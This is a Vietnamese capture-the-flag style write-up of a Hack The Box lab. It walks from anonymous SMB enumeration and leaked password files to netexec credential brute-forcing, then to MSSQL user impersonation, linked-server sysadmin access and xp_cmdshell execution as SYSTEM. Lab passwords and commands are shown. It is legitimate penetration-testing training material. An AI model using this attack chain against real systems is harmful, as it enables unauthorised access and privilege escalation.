---
title: 'HTB: Attacking Common Services - Hard'         
description: 'Một machine ở phần Skills Assessment của Module Attacking Common Services trong path CPTS' # required
pubDate: '2026-08-23'        # required
category: 'CPTS'             # optional
tags: ['HTB', 'CPTS']      # optional
---

# Attacking Common Services - Hard

## Overview

Đây là 1 lab trong phần **Skills Assessment** cuối module **Attacking Common Services.** Context như sau “The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.”. 

## TL;DR

1. Enum SMB để tìm thông tin đăng nhập Windows
2. Dùng tài khoản tìm được để đăng nhập vào MSSQL 
3. Impersonate User khác và kết nối tới Linked Server
4. Sử dụng tài khoản với quyền hạn sysadmin trên Linked Server để thực thi lệnh

## Recon

Sử dụng RustScan để quét các port đang mở và dịch vụ được dùng trên các port: (Vì nmap chậm vl)

```bash
./rustscan -a 10.129.203.10 -- -A -Pn
```

Tìm thấy bốn port đang mở là 135, 445, 1433, 3389 tương ứng với các dịch vụ RPC, SMB, MSSQL, RDP và host đang chạy hệ điều hành Windows.

```bash
PORT     STATE SERVICE       REASON  VERSION
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
445/tcp  open  microsoft-ds? syn-ack
1433/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Chúng ta sẽ bắt đầu với SMB vì đôi khi nó sẽ cho phép truy cập với chế độ Anonymous.

```bash
└──╼ [★]$ smbclient -L //10.129.203.10 -N

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    Home            Disk      
    IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Ngoài các share mặc định có sẵn có một share lạ tên là Home. Tiếp tục truy cập sâu hơn để xem thử bên trong có những gì. 

```bash
smbclient  //10.129.203.10/Home -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 17:18:21 2022
  ..                                  D        0  Thu Apr 21 17:18:21 2022
  HR                                  D        0  Thu Apr 21 16:04:39 2022
  IT                                  D        0  Thu Apr 21 16:11:44 2022
  OPS                                 D        0  Thu Apr 21 16:05:10 2022
  Projects                            D        0  Thu Apr 21 16:04:48 2022

        7706623 blocks of size 4096. 3168875 blocks available
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Thu Apr 21 17:18:21 2022
  ..                                  D        0  Thu Apr 21 17:18:21 2022
  HR                                  D        0  Thu Apr 21 16:04:39 2022
  IT                                  D        0  Thu Apr 21 16:11:44 2022
  OPS                                 D        0  Thu Apr 21 16:05:10 2022
  Projects                            D        0  Thu Apr 21 16:04:48 2022

\HR
  .                                   D        0  Thu Apr 21 16:04:39 2022
  ..                                  D        0  Thu Apr 21 16:04:39 2022

\IT
  .                                   D        0  Thu Apr 21 16:11:44 2022
  ..                                  D        0  Thu Apr 21 16:11:44 2022
  Fiona                               D        0  Thu Apr 21 16:11:53 2022
  John                                D        0  Thu Apr 21 17:15:09 2022
  Simon                               D        0  Thu Apr 21 17:16:07 2022

\OPS
  .                                   D        0  Thu Apr 21 16:05:10 2022
  ..                                  D        0  Thu Apr 21 16:05:10 2022

\Projects
  .                                   D        0  Thu Apr 21 16:04:48 2022
  ..                                  D        0  Thu Apr 21 16:04:48 2022

\IT\Fiona
  .                                   D        0  Thu Apr 21 16:11:53 2022
  ..                                  D        0  Thu Apr 21 16:11:53 2022
  creds.txt                           A      118  Thu Apr 21 16:13:11 2022

\IT\John
  .                                   D        0  Thu Apr 21 17:15:09 2022
  ..                                  D        0  Thu Apr 21 17:15:09 2022
  information.txt                     A      101  Thu Apr 21 17:14:58 2022
  notes.txt                           A      164  Thu Apr 21 17:13:40 2022
  secrets.txt                         A       99  Thu Apr 21 17:15:55 2022

\IT\Simon
  .                                   D        0  Thu Apr 21 17:16:07 2022
  ..                                  D        0  Thu Apr 21 17:16:07 2022
  random.txt                          A       94  Thu Apr 21 17:16:48 2022

        7706623 blocks of size 4096. 3168875 blocks available
smb: \> 
```

Chúng ta thấy được bên trong thư mục IT có các thư mục giống như tên User và chứa các file nhìn rất đáng xem như creds.txt, notes.txt, secrets.txt. Tải thư mục IT về máy attack của chúng ta để tiện đọc các file hơn. Sau khi tải về đọc nội dung các file ta thu được các thông tin rất quan trọng có thể sử dụng để tìm ra tài khoản giúp đặt chân vào hệ thống của mục tiêu.

```bash
┌─[us-academy-2]─[10.10.15.115]─[htb-ac-2187915@htb-dv2nj2obtk]─[~/IT]
└──╼ [★]$ cat Fiona/creds.txt 
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
┌─[us-academy-2]─[10.10.15.115]─[htb-ac-2187915@htb-dv2nj2obtk]─[~/IT]
└──╼ [★]$ cat John/information.txt 
To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.┌─[us-academy-2]─[10.10.15.115]─[htb-ac-2187915@htb-dv2nj2obtk]─[~/IT]
└──╼ [★]$ cat John/notes.txt 
Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world ...┌─[us-academy-2]─[10.10.15.115]─[htb-ac-2187915@htb-dv2nj2obtk]─[~/IT]
└──╼ [★]$ cat John/secrets.txt 
Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123

┌─[us-academy-2]─[10.10.15.115]─[htb-ac-2187915@htb-dv2nj2obtk]─[~/IT]
└──╼ [★]$ cat Simon/random.txt 
Credentials

(k20ASD10934kadA
KDIlalsa9020$
JT9ads02lasSA@
Kaksd032klasdA#
LKads9kasd0-@
```

## Initial Access

Chúng ta sẽ thử brute-force tài khoản Fiona bằng file creds.txt bởi vì nó có chứa nội dung `Windows Creds` rất có thể là tài khoản Windows.

```bash
└──╼ [★]$ netexec smb 10.129.203.10 -u fiona -p creds.txt 
SMB         10.129.203.10   445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:None)
SMB         10.129.203.10   445    WIN-HARD         [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
SMB         10.129.203.10   445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl
```

Đúng như chúng ta dự đoán, bây giờ chúng ta đã đặt chân được vào hệ thống. Vì khi quét port chúng ta thấy có port 3389 mở nên sẽ thử kết nối vào tài khoản Fiona qua RDP xem được không vì thao tác trên Windows qua RDP sẽ dễ hơn nhiều.

## Internal Enum

Sau khi thành công truy cập vào GUI thông qua RDP ta bắt đầu quá trình Enumeration tiếp để thu thập thông tin cho Lateral Movement hoặc Privilege Escalation. Vì khi quét port ta thấy port 1433 mở tương ứng với MSSQL và trên WIN-HARD mà chúng ta vừa đặt chân vào được cũng có các phần mềm liên quan đến việc quản lý cơ sở dữ liệu như: Microsoft SQL Server Management Studio. Ta sẽ thử đăng nhập vào SQL Server bằng Windows Authentication:

![image.png](/images/Attacking%20Common%20Services%20-%20Hard/image.png)

Sau khi đăng nhập chúng ta thấy có 2 Database là TestAppDB và TestingDB. Thử truy cập TestAppDB thì nhận được thông báo không có quyền truy cập còn TestingDB thì là 1 database rỗng không có table nào. Không thể thu thập được thông tin gì từ các DB chúng ta sẽ thử một hướng khác là thử xem có **Execute Command** được không. Chúng ta sẽ chạy thử các câu lệnh SQL trực tiếp trong phần Query của Microsoft SQL Server Management Studio.

## Lateral Movement & Escalation

![image.png](/images/Attacking%20Common%20Services%20-%20Hard/image%201.png)

Ta nhận được thông báo lỗi rằng chúng ta không có quyền để sử dụng xp_cmdshell cũng như bật nó. Tiếp theo chúng ta sẽ thử **Impersonate Existing Users** vì tài khoản hiện tại có quyền quá thấp nhưng nếu chúng ta Impersonate được một user khác có quyền cao hơn như SA thì chúng ta có thể làm được nhiều điều hơn. Truớc hết ta kiểm tra xem có thể Impersonate được những User nào.

![image.png](/images/Attacking%20Common%20Services%20-%20Hard/image%202.png)

Ta có thể Impersonate 2 user là john và simon. Không biết bạn có để ý không nhưng ở trong thư mục IT mà ta khám phá được khi recon SMB có thư mục tên John và trong đấy có file tên information.txt chứa nội dung: 

```bash
To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.
```

Rất có thể John là người được giao nhiệm vụ quản lý database nên sẽ có quyền hạn cao hơn các người dùng bình thường. Ta sẽ Impersonate John trước và kiểm tra xem có Linked Server nào không và quyền hạn của John đối với server đấy như thế nào vì trên file information.txt có đề cập tới.

![image.png](/images/Attacking%20Common%20Services%20-%20Hard/image%203.png)

Sau khi Impersonate user John check quyền ta thấy John vẫn không có quyền cao hơn như sysadmin. Ta sẽ tiếp tục check xem có Linked Server nào không:

![image.png](/images/Attacking%20Common%20Services%20-%20Hard/image%204.png)

Ta thấy có Linked Server tên `LOCAL.TEST.LINKED.SRV`. Ta sẽ kiểm tra tài khoản và quyền hạn của tài khoản trên server này.

![image.png](/images/Attacking%20Common%20Services%20-%20Hard/image%205.png)

Tài khoản của ta khi truy cập tới Linked Server này được chạy với tài khoản testadmin có quyền sysadmin. Đây là thứ mà ta tìm kiếm quyền hạn đủ cao để ta thực hiện những hành động mà ta muốn. Ta bật xp_cmdshell và nhận thấy shell đang chạy dưới tài khoản `NT AUTHORITY\SYSTEM` vì dịch vụ MSSQL đang chạy dưới tài khoản SYSTEM. Do đó ta có thể đọc được flag.txt ở Desktop của Administrator. 

![image.png](/images/Attacking%20Common%20Services%20-%20Hard/image%206.png)
